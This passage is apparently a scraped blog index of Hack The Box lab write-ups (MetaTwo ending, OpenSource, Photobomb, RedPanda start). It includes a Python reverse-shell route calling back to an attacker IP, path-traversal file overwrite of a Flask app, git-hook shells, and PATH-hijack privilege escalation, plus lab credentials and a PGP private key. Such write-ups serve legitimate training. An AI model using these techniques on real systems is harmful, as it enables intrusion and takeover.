oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4 V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n WP4HAwKQfLVcyzeqrf8h02o0Q7OLrTXfDw4sd/a56XWRGGeGJgkRXzAqPQGWrsDC 6/eahMAwMFbfkhyWXlifgtfdcQme2XSUCNWtF6RCEAbYm0nAtDNQYXNzcGllIChB dXRvLWdlbmVyYXRlZCBieSBQYXNzcGllKSA8cGFzc3BpZUBsb2NhbD6IkAQTEQgA OBYhBHxnhqdWG8hPUEhnHjh3dcNXRdIDBQJiuFfWAhsjBQsJCAcCBhUKCQgLAgQW AgMBAh4BAheAAAoJEDh3dcNXRdIDRFQA/3V6S3ad2W9c1fq62+X7TcuCaKWkDk4e qalFZ3bhSFVIAP4qI7yXjBXZU4+Rd+gZKp77UNFdqcCyhGl1GpAJyyERDZ0BXwRi uFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J CBcYy2EePd5ueDYC9iN3H7BYlhAUaRvlU7732CY6Tbw1jbmGFLyIxS7jHJwd3dXT +PyrTxF+odQ6aSEhT4JZrCk5Ef7/7aGMH4UcXuiWrgTPFiDovicAAwUD/i6Q+sq+ FZplPakkaWO7hBC8NdCWsBKIQcPqZoyoEY7m0mpuSn4Mm0wX1SgNrncUFEUR6pyV jqRBTGfPPjwLlaw5zfV+r7q+P/jTD09usYYFglqJj/Oi47UVT13ThYKyxKL0nn8G JiJHAWqExFeq8eD22pTIoueyrybCfRJxzlJV/gcDAsPttfCSRgia/1PrBxACO3+4 VxHfI4p2KFuza9hwok3jrRS7D9CM51fK/XJkMehVoVyvetNXwXUotoEYeqoDZVEB J2h0nXerWPkNKRrrfYh4BBgRCAAgFiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4 V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN =7Uo6 -----END PGP PRIVATE KEY BLOCK----- We can try cracking pgp key But we need to convert it using gpg2john We need to remove public part since it fails Then use john to crack it Try extracting root password again using blink182 passphrase And it works jnelson@meta2:~/.passpie$ passpie copy --to stdout --passphrase blink182 root@ssh p7qfAZt4_A1xo_0x jnelson@meta2:~/.passpie$ su - Password: root@meta2:~# ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/metatwo/images/metatwo.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/metatwo/","summary":"MetaTwo Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.11.186 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 20:05 BST Warning: 10.10.11.186 giving up on port because retransmission cap hit (6). Stats: 0:02:40 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 77.06% done; ETC: 20:09 (0:00:48 remaining) Nmap scan report for 10.10.11.186 (10.10.11.186) Host is up (0.18s latency). Not shown: 811 closed tcp ports (conn-refused), 186 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (Debian) [::ffff:10.","tags":["HTB","wordpress","bookingpress","cve\"-2022-0739\"","sqli","sqlmap","john","xxe","cve-2021-29447","passpie","pgp","gpg2john"],"title":"[HTB] Machine: MetaTwo"},{"categories":null,"contents":"OpenSource Enumeration nmap └─$ nmap -Pn -p- 10.10.11.164 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:01 BST Stats: 0:11:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 97.88% done; ETC: 18:13 (0:00:15 remaining) Nmap scan report for 10.10.11.164 (10.10.11.164) Host is up (0.15s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp filtered ppp └─$ nmap -Pn -sC -sV 10.10.11.164 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:14 BST Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 18:15 (0:00:42 remaining) Nmap scan report for 10.10.11.164 (10.10.11.164) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 |_http-title: upcloud - Upload files for Free! |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Mon, 28 Aug 2023 17:13:51 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;upcloud - Upload files for Free!\u0026lt;/title\u0026gt; | \u0026lt;script src=\u0026#34;/static/vendor/jquery/jquery-3.4.1.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\u0026#34;/static/vendor/popper/popper.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\u0026#34;/static/vendor/bootstrap/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\u0026#34;/static/js/ie10-viewport-bug-workaround.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/vendor/bootstrap/css/bootstrap.css\u0026#34;/\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34; /static/vendor/bootstrap/css/bootstrap-grid.css\u0026#34;/\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34; /static/vendor/bootstrap/css/bootstrap-reboot.css\u0026#34;/\u0026gt; | \u0026lt;link rel= | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Mon, 28 Aug 2023 17:13:52 GMT | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, HEAD, GET | Content-Length: 0 | Connection: close | RTSPRequest: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; | \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request version (\u0026#39;RTSP/1.0\u0026#39;).\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 3000/tcp filtered ppp 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.94%I=7%D=8/28%Time=64ECD5F3%P=x86_64-pc-linux-gnu%r(GetR SF:equest,1039,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20P SF:ython/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2028\\x20Aug\\x202023\\x2017:13:51\\x20GMT SF:\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20 SF:5316\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\\x20 SF:\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;UTF-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name= SF:\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial-scale=1\\.0\\\u0026#34;\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;upcloud\\x20-\\x20Upload\\x20files\\x20for\\x20Free! SF:\u0026lt;/title\u0026gt;\\n\\n\\x20\\x20\\x20\\x20\u0026lt;script\\x20src=\\\u0026#34;/static/vendor/jquery/jque SF:ry-3\\.4\\.1\\.min\\.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;script\\x20src=\\\u0026#34;/stat SF:ic/vendor/popper/popper\\.min\\.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\\n\\n\\x20\\x20\\x20\\x20\u0026lt;script SF:\\x20src=\\\u0026#34;/static/vendor/bootstrap/js/bootstrap\\.min\\.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\\n\\ SF:x20\\x20\\x20\\x20\u0026lt;script\\x20src=\\\u0026#34;/static/js/ie10-viewport-bug-workaround SF:\\.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\\n\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href SF:=\\\u0026#34;/static/vendor/bootstrap/css/bootstrap\\.css\\\u0026#34;/\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;li SF:nk\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;\\x20/static/vendor/bootstrap/css/boo SF:tstrap-grid\\.css\\\u0026#34;/\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20hr SF:ef=\\\u0026#34;\\x20/static/vendor/bootstrap/css/bootstrap-reboot\\.css\\\u0026#34;/\u0026gt;\\n\\n\\x20 SF:\\x20\\x20\\x20\u0026lt;link\\x20rel=\u0026#34;)%r(HTTPOptions,C7,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\ SF:nServer:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2028\\ SF:x20Aug\\x202023\\x2017:13:52\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20cha SF:rset=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20HEAD,\\x20GET\\r\\nContent-Length:\\x20 SF:0\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,1F4,\u0026#34;\u0026lt;!DOCTYPE\\x20HTM SF:L\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTML\\x204\\.01//EN\\\u0026#34;\\n\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\\u0026#34;http://www\\.w3\\.org/TR/html4/strict\\.dtd\\\u0026#34;\u0026gt;\\n\u0026lt;html\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20http-equ SF:iv=\\\u0026#34;Content-Type\\\u0026#34;\\x20content=\\\u0026#34;text/html;charset=utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Error\\x20response\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x2 SF:0\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;E SF:rror\\x20response\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code SF::\\x20400\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Message:\\x20Bad\\x20req SF:uest\\x20version\\x20\\(\u0026#39;RTSP/1\\.0\u0026#39;\\)\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\u0026lt;p\u0026gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20-\\x20 SF:Bad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20 SF:\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web Server gobuster └─$ gobuster dir -u http://10.10.11.164 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.164 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/28 18:18:08 Starting gobuster in directory enumeration mode =============================================================== /download (Status: 200) [Size: 2489147] /console (Status: 200) [Size: 1563] Foothold If we visit /download we download source files It indicates that the app is running in docker container └─$ tree -L 2 . ├── app │ ├── app │ ├── INSTALL.md │ ├── public │ └── run.py ├── build-docker.sh ├── config │ └── supervisord.conf └── Dockerfile Let\u0026rsquo;s start by analyzing git dev branch git checkout dev We have proxy creds removed in the third commit: dev01:Soulless_Developer#2022 Also Dockerfile indicates that flask is in debug mode In master branch views.py we have only 2 routes import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload_file(): if request.method == \u0026#39;POST\u0026#39;: f = request.files[\u0026#39;file\u0026#39;] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, file_name) f.save(file_path) return render_template(\u0026#39;success.html\u0026#39;, file_url=request.host_url + \u0026#34;uploads/\u0026#34; + file_name) return render_template(\u0026#39;upload.html\u0026#39;) @app.route(\u0026#39;/uploads/\u0026lt;path:path\u0026gt;\u0026#39;) def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, path)) While in dev branch we have 4 Which we see in actual box, so probably dev app is currently running Moreover we saw console route also in gobuster import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/download\u0026#39;) def download(): return send_file(os.path.join(os.getcwd(), \u0026#34;app\u0026#34;, \u0026#34;static\u0026#34;, \u0026#34;source.zip\u0026#34;)) @app.route(\u0026#39;/upcloud\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload_file(): if request.method == \u0026#39;POST\u0026#39;: f = request.files[\u0026#39;file\u0026#39;] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, file_name) f.save(file_path) return render_template(\u0026#39;success.html\u0026#39;, file_url=request.host_url + \u0026#34;uploads/\u0026#34; + file_name) return render_template(\u0026#39;upload.html\u0026#39;) @app.route(\u0026#39;/uploads/\u0026lt;path:path\u0026gt;\u0026#39;) def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, path)) /console We have a potential lfi in upcloud route file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, file_name) If we read the docs If a segment is an absolute path (which on Windows requires both a drive and a root), then all previous segments are ignored and joining continues from the absolute path segment. If we visit http://10.10.11.164/uploads//etc/passwd, it results in error We can utilize get_file_name function in utils.py, which replaces ../ So if we send http://10.10.11.164/uploads/..//etc/passwd, it could work Since app is running in debug mode, it will reload source files whenever there are changes occur So we can try overwriting views.py using upcloud route (both uploads and upcloud use os.path.join) For example adding one more route with web shell or reverse shell We know the location of the app is in /app based on Dockerfile Modify views.py Add revshell route with reverse shell code ... @app.route(\u0026#39;/revshell\u0026#39;) def revshell(): import socket import os import pty s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.10.16.5\u0026#34;,6666)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) pty.spawn(\u0026#34;sh\u0026#34;) Let\u0026rsquo;s start listener and upload malicious source file We need to intercept the request and change the filename I had weird symbols, but after upgrading the shell they dissappeared User Enumerate We know it\u0026rsquo;s a container / # ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:07 inet addr:172.17.0.7 Bcast:172.17.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:995159 errors:0 dropped:0 overruns:0 frame:0 TX packets:994203 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:86315357 (82.3 MiB) TX bytes:155143921 (147.9 MiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) / # ip route default via 172.17.0.1 dev eth0 172.17.0.0/16 dev eth0 scope link src 172.17.0.7 I was stuck here for a while, until I saw a port 3000 in nmap results which was filtered So I tried wget that port from container (curl is not installed) It\u0026rsquo;s a Gitea Let\u0026rsquo;s upload chisel and configure port forwarding Container: ./chisel client 10.10.16.5:9001 R:3000:172.17.0.1:3000, forward remote(R) port 3000 (attack box) to 172.17.0.1:3000 Attack box: ./chisel server -p 9001 --reverse Now we can check Gitea from our attack box Use creds for dev01 that were found before We have home-backup repo with .ssh and keys in it Let\u0026rsquo;s download them ssh using the key Don\u0026rsquo;t forget chmod 600 id_rsa Root No sudo rights Creds for dev01 works linpeas shows git-sync script in /usr/local/bin/ pspy also shows the same script running every minute The content of the git-sync dev01@opensource:/tmp$ cat /usr/local/bin/git-sync #!/bin/bash cd /home/dev01/ if ! git status --porcelain; then echo \u0026#34;No changes\u0026#34; else day=$(date +\u0026#39;%Y-%m-%d\u0026#39;) echo \u0026#34;Changes detected, pushing..\u0026#34; git add . git commit -m \u0026#34;Backup for ${day}\u0026#34; git push origin main fi We can utilize git-hooks So that whenever someone tries to commit dev01\u0026rsquo;s home directory, the custom script will be launched ( because we know that it\u0026rsquo;s being backed up by script above periodically) According to docs, everything with .sample is skipped Let\u0026rsquo;s create a reverse shell script in hooks directory ...The pre-commit hook is run first, before you even type in a commit message..., so let\u0026rsquo;s name our script pre-commit Get root flag ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/opensource/images/opensource.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/opensource/","summary":"OpenSource Enumeration nmap └─$ nmap -Pn -p- 10.10.11.164 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:01 BST Stats: 0:11:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 97.88% done; ETC: 18:13 (0:00:15 remaining) Nmap scan report for 10.10.11.164 (10.10.11.164) Host is up (0.15s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp filtered ppp └─$ nmap -Pn -sC -sV 10.","tags":["HTB","upload","source-code","git","git-hooks","flask","directory-traversal","file-read","flask-debug","flask-debug-pin","chisel","gitea","pspy","werkzeug","werkzeug-debug"],"title":"[HTB] Machine: OpenSource"},{"categories":null,"contents":"Photobomb Enumeration nmap └─$ nmap -Pn -p- 10.10.11.182 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 10:16 BST Warning: 10.10.11.182 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.182 (10.10.11.182) Host is up (0.16s latency). Not shown: 65523 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.11.182 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 10:44 BST Nmap scan report for 10.10.11.182 (10.10.11.182) Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA) | 256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA) |_ 256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://photobomb.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds Web server gobuster └─$ gobuster dir -u http://photobomb.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://photobomb.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/08/30 10:49:19 Starting gobuster in directory enumeration mode =============================================================== /printer (Status: 401) [Size: 188] /printer.txt (Status: 401) [Size: 188] /printer.php (Status: 401) [Size: 188] /printers (Status: 401) [Size: 188] /printers.txt (Status: 401) [Size: 188] /printers.php (Status: 401) [Size: 188] /printerfriendly (Status: 401) [Size: 188] /printerfriendly.php (Status: 401) [Size: 188] /printerfriendly.txt (Status: 401) [Size: 188] /printer_friendly (Status: 401) [Size: 188] /printer_friendly.txt (Status: 401) [Size: 188] /printer_friendly.php (Status: 401) [Size: 188] vhosts Nothing └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://photobomb.htb/\u0026#39; -H \u0026#39;Host: FUZZ.photobomb.htb\u0026#39; -fs 154 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://photobomb.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.photobomb.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 154 ________________________________________________ Foothold/User http://photobomb.htb/printer No creds http://photobomb.htb/index.php If we check sources for http://photobomb.htb/ we have cresd for printer pH0t0:b0Mb! They work When we select image and specific options we have a POST request filetype resulted in interesting response, while other parameters responded in error If we ping attack box we receive response Now, let\u0026rsquo;s get revshell Root We have sudo rights wizard@photobomb:~/photobomb$ sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh wizard@photobomb:~/photobomb$ wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] \u0026amp;\u0026amp; ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log \u0026gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name \u0026#39;*.jpg\u0026#39; -exec chown root:root {} \\; We have SETENV uses current environment find is used without full path So we can create a find script and place it /tmp And run the script with PATH variable due to SETENV ...environment variables set on the command line are not subject to the restrictions imposed by env_check, env_delete, or env_keep... wizard@photobomb:/tmp$ echo -e \u0026#39;#!/bin/bash\\n\\nbash\u0026#39; \u0026gt; find wizard@photobomb:/tmp$ chmod +x find wizard@photobomb:/tmp$ cat find #!/bin/bash bash wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh root@photobomb:/home/wizard/photobomb# whoami root Intended path /opt/.bashrc enable -n [ # ] is disabling [ command [ is the same as test # System-wide .bashrc file for interactive bash(1) shells. # To enable the settings / commands in this file for login shells as well, # this file has to be sourced in /etc/profile. # Jameson: ensure that snaps don\u0026#39;t interfere, \u0026#39;cos they are dumb PATH=${PATH/:\\/snap\\/bin/} # Jameson: caused problems with testing whether to rotate the log file enable -n [ # ] ... wizard@photobomb:/tmp$ which [ /usr/bin/[ - The path is similar to what we did with `find` ![](./images/13.png) ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/photobomb/images/photobomb.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/photobomb/","summary":"Photobomb Enumeration nmap └─$ nmap -Pn -p- 10.10.11.182 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 10:16 BST Warning: 10.10.11.182 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.182 (10.10.11.182) Host is up (0.16s latency). Not shown: 65523 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.11.182 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 10:44 BST Nmap scan report for 10.","tags":["HTB","bash","bash-test","image-magick","command-injection","injection","path-hijack","bash-builtins"],"title":"[HTB] Machine: Photobomb"},{"categories":null,"contents":"RedPanda Enumeration nmap └─$ nmap -p- -Pn 10.10.11.170 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 19:41 BST Nmap scan report for 10.10.11.170 (10.10.11.170) Host is up (0.14s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy └─$ nmap -p22,8080 -sC -sV -Pn 10.10.11.170 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 19:50 BST Nmap scan report for 10.10.11.170 (10.10.11.170) Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 8080/tcp open http-proxy |_http-title: Red Panda Search | Made with Spring Boot |_http-open-proxy: Proxy might be redirecting requests | fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8 | Content-Language: en-US | Date: Tue, 29 Aug 2023 18:50:20 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34; dir=\u0026#34;ltr\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta author=\u0026#34;wooden_k\u0026#34;\u0026gt; | \u0026lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --\u0026gt; | \u0026lt;link 